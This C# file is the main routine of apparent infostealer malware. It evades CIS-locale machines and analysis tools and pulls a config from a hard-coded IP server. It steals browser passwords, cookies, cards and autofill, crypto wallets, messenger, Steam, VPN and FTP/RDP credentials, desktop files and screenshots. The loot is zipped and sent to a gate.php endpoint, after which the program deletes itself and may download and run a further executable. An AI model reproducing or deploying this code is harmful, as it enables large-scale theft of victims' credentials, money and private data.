using System;
using steam1;
using killer;
using System.IO;
using Screen;
using hw1d;
using tdata;
using d3sktop;
using trashman;
using opvpn;
using jaber;
using cr;
using c0unt;
using Nordvpn;
using f1lezilla;
using bitdomain;
using brtest;
using prtvpn;
using skypemsg;
using total;
using wnscp;
using l0ad;
using System.Net;

namespace White
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            if (killerr.CIS())
            {
                killerr.SelfDel();
                return;
            }
            if (killerr.antirevers3()) 
            {
                killerr.SelfDel(); 
                return;
            }
            string url = "http://80.233.134.237/";
            string config = new WebClient().DownloadString(url + "cfg.php");
            string workdir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows";
            Directory.CreateDirectory(workdir);
            browserstest.mozilla();
            browserstest.History();
            browserstest.autofill();
            browserstest.cc();
            browserstest.Passwords();
            browserstest.Cookies();
            dnschange.dns("8.8.8.8");
            if(config[4].ToString() == "1")
            {
                totcom.totalcommander();
                winscp.winsccp();
                filezilla.file();
                rDr.rdp.Rdp();
                wsftpp.wsftp.ws_ftp();
            }
            hwid.GetHWID();
            hwid.getprocesses();
            if(config[0].ToString() == "1")
            {
                crypto.DirSearch(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                crypto.DirSearch(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                crypto.DirSearch(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
                crypto.DirSearch(@"C:\Users\" + Environment.UserName + @"\Downloads");
            }
            if(config[1].ToString() == "1")
            {
                desktop.desktop_text(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                desktop.dekstop_dir(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                desktop.dekstop_dir(@"C:\Users\" + Environment.UserName + @"\Downloads");
                desktop.desktop_text(@"C:\Users\" + Environment.UserName + @"\Downloads");
            }
            jabber.jab();
            telegram.telegramData();
            ScreenShot.Screenshot();
            hwid.getprogrammes();
            steam.Steam(); 
            skype.skypelog();
            if(config[2].ToString() =="1")
            {
                nord.vpn();
                protonvpn.pr0t0nvpn();
                ovpn.openvpn();
            }
            int st = count.GetSteam();
            int jd = count.GetJabber();
            int cr = count.GetCrypto();
            int ds = count.GetDesktop();
            int dr = count.GetDiscord();
            string hwd = trash.rndname(10);
            string[] fs = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            foreach (string f in fs)
            {
                if (Path.GetFileName(f).StartsWith("System_"))
                {
                    File.Delete(f);
                }
            }

            using (var web = new WebClient())
            {
                web.DownloadFile(url + "ICSharpCode.SharpZipLib.dll", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"/ICSharpCode.SharpZipLib.dll");
                trash.Zip(hwd, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), workdir);
            }

            trash.s3nder(url + "gate.php?hwid=" + hwd + "&crypto=" + cr + "&jabber=" + jd + "&steam=" + st + "&desktop=" + ds + "&discord=" + dr, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/" + hwd + ".zip");
            Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows", true);
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/" + hwd + ".zip"); 
            killerr.SelfDel();
            if(config[3].ToString() == "0") Loader.loader(url + "system.exe", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/system.exe");
        }
    }
}
